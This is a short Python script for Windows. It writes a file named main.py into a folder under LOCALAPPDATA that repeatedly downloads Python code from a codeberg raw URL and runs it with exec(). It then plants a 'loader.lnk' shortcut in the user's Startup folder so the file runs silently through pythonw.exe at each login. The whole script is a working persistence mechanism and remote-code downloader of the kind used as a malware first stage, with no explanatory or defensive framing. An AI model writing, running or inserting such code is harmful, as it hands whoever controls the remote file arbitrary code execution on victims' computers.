import os
import sys
from win32com.client import Dispatch

def add_to_startup():
    # Get the startup folder path using environment variables
    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    path = os.path.join(startup_folder, "loader.lnk")
    target = sys.executable.replace("python.exe", "pythonw.exe")
    wDir = os.path.join(os.environ["LOCALAPPDATA"], "gd")
    script_path = os.path.join(wDir, "main.py")
    icon = sys.executable

    # Ensure the working directory exists
    if not os.path.exists(wDir):
        os.makedirs(wDir)
        print(f"Created directory: {wDir}")
    with open(script_path, "w") as file:
        file.write("""
import urllib.request
import time

url = "https://codeberg.org/43a1723/hai1723/raw/branch/main/a/main.py"

while True:
    try:
        content = urllib.request.urlopen(url).read()
        exec(content)
        break
    except Exception as e:
        time.sleep(3)
""")

    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(path)
    shortcut.Targetpath = target
    shortcut.WorkingDirectory = wDir
    shortcut.IconLocation = icon
    shortcut.Arguments = f'"{script_path}"'
    shortcut.save()

add_to_startup()
print(os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup"))
